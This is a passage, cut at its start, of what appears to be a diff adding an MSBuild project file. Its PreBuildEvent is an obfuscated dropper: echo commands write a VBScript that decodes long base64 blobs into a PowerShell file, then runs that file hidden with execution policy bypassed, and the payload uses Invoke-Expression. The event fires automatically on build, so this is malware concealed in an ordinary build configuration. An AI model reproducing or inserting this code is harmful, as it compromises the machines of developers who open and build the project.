wVkRtQXRxdkM2cFMxNWtZYm9vTVZFU3dIRThFTlpXaElXbzNoNnpIZEFuMjdWWTBPVEVTVUxDK3ZML1BINElzUWFiL1NXaGhjRkEvblNJMVJuS3JacnJJT3pueEhSVGNLQUFVcWNFdWNCcnVxMVQ5cXVyVXZGMCI7JHRtID0gJGVCLlRvQ2hhckFycmF5KCk7W2FycmF5XTo6UmV2ZXJzZSgkdG0pOyRSID0gRCAtZUJaICR0bSAtZW5jICIiOyR0ID0gJFIuVG9DaGFyQXJyYXkoKTsgW2FycmF5XTo6UmV2ZXJzZSgkdCk7ICRCVlYgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC1qb2luICR0KSk7ICRFUFggPSAiSW52b2tlLUV4cHJlc3Npb24iOyBOZXctQWxpYXMgLU5hbWUgcFdOIC1WYWx1ZSAkRVBYIC1Gb3JjZTsgcFdOICRCVlY=&quot; &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo d = &quot;MGtHNmlGZjI1ZFNpMzF5MGdkZGhBcEllaHRFOFIwak93TEdsVUV3M0xBYVA1Z3lCUUhsQ2swTWVjZS81eFdoeHUwMHNtTFlYeHJ4NGJTQVVZL2QzL3Uya0ZRL1h0SHpmRzE1Um45WkpaZkw1aWRiUVBZNFl5UUVTTmNLQjAvUmx3Q1MxQ1pWdXA0cmpGa1N3SVZBL1JRV2phRW9NQTg1dzhlWGEvVmZmRFZwYmxOS1BpdTZRRGFFODZSeGwzcXp0R2ZMeWZTRGhRSVR0M2FZRTRtOVlFeWNrb0c5Sm15SGdTMWNaV1VmYnVJRWxRNWcxZEhEcHVNdXRxODQzV0YyT0F5dlZvQWYzSkI4WUY1QmR5Nkt6Y1dZRDN1dEpPWmIxZWN4Q2JGOVczNHFtcFNRZm9uRG5EQnMrTnBQM2g3bGhiekpQV3M4d0lHMy91TkVKSlJmOUtTV1dpMmRtRmpidzJPd1ZUVzNsdnRMTkh3Q3VUVjVmbTNPWXdzT3VidlAwQldHWGxZSlJrK2kram1MZGt0bTZPYmd0aXNCQ2h4WTNBUjhkNE1MeXdONDJ5aHBIeXJSWXFTYmZoQXFUbTBoTXRRR29aSGJvdXIzd0R2bFQ2dDNld0hXWkp0a2NLVDFvczZLL2ZUUTdQaDFVbkdZeWMrN2RzMVQ2T1o4anI4ZGhTWWozUjNsRU1rRmdwdUd1OGpxUktGbUpSZzdTZEVROTdBM2dnMXZwUktUVnpEdWdMRnpveGp2ZmlhNDJzQTdwNmNoOXA0QzV0b3QvaXV3dGtqSEMzM21OQXZ3RXRIUzhaY1ZJbXUyWVFoQWxFMXUwc3h0ZG92REJYZVNKdm9ueGZoYzVrSXNGLzR0QzEwVTZ6V2wrWFY2Vjk3S2xaNW1KMWFraXV4aERqK09zR3pMWTdHWU02SkI4VG5RQWtjQmtENlJib0RSUk1yN1l5Sy9NM3Ayblk0VlF2alZkdlRTQ01kQjc3Y0FCWUQzZkxuQlZTY2NwbDJXT3VUTzRMWS9Ha1dKSCtNaCtKTklIRFBQN0pCTnNSYjNSLzk0Y1pSWndhTGp5Qm5WS2NyR1ZXT0dNeFQ0aUgvUHJiZ2FBNzYxT2JHYW82MWw5Q2RaaU5Ea0F4MzVDSEpSWWtHK2dDTzdvY1JoRG1EYTRXWlZxMXc5dk1UR3kxMmswc0VJMWM2ckIzbTdQUU5KL0IyZXE4bEdVcm91QWwzdWZGS3o5M3VzZlR1VDQ4NnkyK0E0amJEZW5kZHhzeFM0M055cHJoeXJJSkV3ZEJ3M2xidzQySGtaWXFYNFdvZEVTQ20wdlBVT2JucWtneHpObERRMGdVN3o0UzJvL3Z2bzY0Szd0aFZwOTFMb1ZtR1B3VkpHaWpOay9ZZ01IbG5wOGNZWUpyZG1rRVlKYzRObDJOUXpHdHdmbzBYU0VlRUlqbVg0aGs0WHVlc3ozdHlUeGFRU1FLZVdHWWt0N1pvalcxZ0dHN2pveHNUUTF4YmxzYUh4UExuek1mZk9tem12WXI1R2xzV21vdmFKRTg3TkVCckRBYjgraWdSRG5iZlJzTE5vTWZzN3B3cURUSmJaWFV3bGViT3lFT0l4Um1XM2NVUm52eVFDZFBZWDRQUkR4d0I4eDgyN2dPTXZZWmhPZjZtZWtjd2E0QjVsM253ZnZXZkVodTVuOHJsaGJyOUJQbmF0TnkxV0cxVWkvK1h3QjluNDJiVnFZVjFtclhtMFQ1dkxPbmRPQm5Ld0VnTFRsWW9HQ2xnemtsSzBwUjNqMi9UaERIR2pCRkxzdXNpTG1wTjlBbjRjSVBJS0VoTjdBTjJQNE5hcWh0cytabGJveEdlZFFxcWtvOEtJRDZuMGFUUjhSUklyT2xQTkZzV2g5aHFDVTdSeiszcXRGQUtkWGR4R2VXQzBzTTlCcXNmcUlRZ241Z2l5Q3RJM0cxMHphWWpMRXJpcWFyUlE4ZmZTTDJHK3Nqcm9weityeTZ3OERhRlp3UmJFZ2VJWXo1VFpqUFZUdUc4ZFpjalR1TkcvNUgxMzd1RlNvdWViZzU5TndHclNKa0dEZUgvVXk0U2VMZEdPb3FFTzNxSTh1UEY2UW9xNEhCZnVxd0xZUW8zaDZTd1MzNmhPYXNEY0dSVVhtcEdpc2FWMUxDZEcrWlJKTDZ3dmY1ZWhVeHY3ZXNyUXpwc3J2NzFENENGKyt2RXo3R1NlRjBLc0VnYmtGYTRFb3MvZE80QnVTNFNmbmFQamxYbjIyMjVIenR5a3NxdGQxRFVTWXptZFZIMVVqMGN1UWtaWTljR2k4Zk94MjduMnlXUCtkc0ZwMkwrNEtDbmhSUDdvcHRKTC9wVjRRZ2hwZy9SaGMzOGpPcjgrdUN0ZUxKMWRPQWFTbm56WVNwSlNFcjVrejd1YjBCUGFMcTluSDdYSEMrZ3pYV2xTK0lHVFJaN2lHS21nYlhSZUtRNkpZczE5WEU5dTJITlR5bXdxdHMrMm1heFhwUHFzSGxCcDJrT2V5ek8rZGhOazBGK3hkQjNtajVHSTMxT2g3L3ZOSGxFRGtYS1lmemcyWXhBVG8zeUdKT3RIYVpxL3BXZWpSMjhUTXlZNEY3bVIrK3c4eW9PVlAyV3FYdmh3dFJIL0ZhZ2ZKR1ZMQXlVTW9xZC8yOWVKdlpPMjdMeG5BaytDVHA3MDIvRTc4VDBUTm9MSkQx&quot; &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo e = b ^&amp; d ^&amp; c &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo Set f = CreateObject(&quot;MSXml2.DOMDocument.6.0&quot;).createElement(&quot;base64&quot;) &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo f.DataType = &quot;bin.base64&quot; &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo f.Text = e &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo g = f.NodeTypedValue &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo h = &quot;%25a%25\ONCx.ps1.ps1&quot; &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo Set j = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo Set k = j.CreateTextFile(h, True) &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo k.Write l(g) &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo k.Close &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo Set m = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo m.Run &quot;powershell.exe -ExecutionPolicy Bypass -File &quot; ^&amp; h, 0, False &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo Function l(n) &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo Dim o, p &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo Set o = CreateObject(&quot;ADODB.Recordset&quot;) &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo p = LenB(n) &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo If p ^&gt; 0 Then &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo o.Fields.Append &quot;q&quot;, 201, p &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo o.Open &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo o.AddNew &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo o(&quot;q&quot;).AppendChunk n &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo o.Update &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo l = o(&quot;q&quot;).GetChunk(p) &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo Else &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo l = &quot;&quot; &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo End If &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo End Function &gt;&gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;cscript //nologo &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;endlocal</PreBuildEvent>
+  </PropertyGroup>
+</Project>
